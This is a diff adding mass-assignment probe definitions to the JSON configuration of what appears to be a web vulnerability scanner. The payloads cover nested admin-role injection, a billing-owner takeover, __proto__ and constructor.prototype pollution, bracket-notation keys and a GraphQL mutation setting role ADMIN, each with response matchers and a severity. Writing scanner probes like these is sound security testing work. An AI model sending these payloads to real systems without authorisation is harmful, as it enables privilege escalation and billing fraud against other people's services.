@@ -70,6 +70,83 @@
           "confidence_boost": 35
         }
       ]
+    },
+    "nested_object_assignment": {
+      "description": "Nested-JSON privilege escalation — flat protection (`only :name, :email`) fails when attacker injects nested objects. Most common in Rails (strong parameters bypass), Express+lodash.merge, Mongoose populate, GraphQL inputs.",
+      "tech_match": ["rails", "express", "node", "mongoose", "graphql"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"name\":\"x\",\"user\":{\"role\":{\"admin\":true}}}",
+          "description": "Two-level nested admin assignment — bypasses strong-params that only whitelist top-level. Common in Rails update_attributes(params).",
+          "matchers": [{"type": "status", "status": [200, 201]}, {"type": "not_word", "words": ["forbidden", "unauthorized", "unpermitted"]}],
+          "severity": "critical",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "{\"settings\":{\"billing\":{\"owner_id\":1,\"plan\":\"enterprise\"}}}",
+          "description": "Settings.billing nested takeover — can switch billing owner or upgrade plan without paying.",
+          "matchers": [{"type": "status", "status": [200, 201]}, {"type": "not_word", "words": ["forbidden", "denied"]}],
+          "severity": "critical",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "{\"profile\":{\"permissions\":[\"admin\",\"superuser\"]}}",
+          "description": "Permission-array assignment. Some libs (Mongoose, Sequelize) replace whole array on update.",
+          "matchers": [{"type": "status", "status": [200, 201]}, {"type": "not_word", "words": ["forbidden", "unauthorized"]}],
+          "severity": "critical",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "{\"__proto__\":{\"isAdmin\":true}}",
+          "description": "Prototype pollution via mass assignment — pollutes Object.prototype.isAdmin, downstream `if (user.isAdmin)` checks pass for everyone.",
+          "matchers": [{"type": "status", "status": [200, 201]}],
+          "severity": "critical",
+          "confidence_boost": 60
+        },
+        {
+          "payload": "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}",
+          "description": "Alternate prototype pollution path (constructor.prototype) — defeats __proto__ filtering.",
+          "matchers": [{"type": "status", "status": [200, 201]}],
+          "severity": "critical",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "{\"user[role]\":\"admin\"}",
+          "description": "Bracket-notation flat key — Rails / PHP / .NET parse this as nested. Bypasses naive 'no dots in key' filters.",
+          "matchers": [{"type": "status", "status": [200, 201]}, {"type": "not_word", "words": ["forbidden"]}],
+          "severity": "critical",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "{\"items\":[{\"id\":1,\"price\":0,\"approved\":true}]}",
+          "description": "Array-element mass assignment — bulk-update endpoints often skip per-element validation.",
+          "matchers": [{"type": "status", "status": [200, 201]}],
+          "severity": "high",
+          "confidence_boost": 45
+        },
+        {
+          "payload": "{\"meta\":{\"_owner\":\"victim_id\"}}",
+          "description": "Underscore-prefixed metadata — Mongoose/Mongo internal-looking fields that some apps trust as authoritative.",
+          "matchers": [{"type": "status", "status": [200, 201]}],
+          "severity": "high",
+          "confidence_boost": 40
+        }
+      ]
+    },
+    "graphql_input_overreach": {
+      "description": "GraphQL InputType mass assignment — input type with optional fields lets attacker set role/admin even though the UI doesn't expose them.",
+      "tech_match": ["graphql"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "mutation { updateUser(input: {id: 1, role: ADMIN, isVerified: true}) { id role } }",
+          "description": "Pass restricted fields in GraphQL mutation input. Server may accept and persist if no resolver-level guard.",
+          "matchers": [{"type": "word", "any": ["\"role\":\"ADMIN\"", "isVerified\":true"]}, {"type": "not_word", "words": ["error", "forbidden"]}],
+          "severity": "critical",
+          "confidence_boost": 60
+        }
+      ]
     }
   }
 }
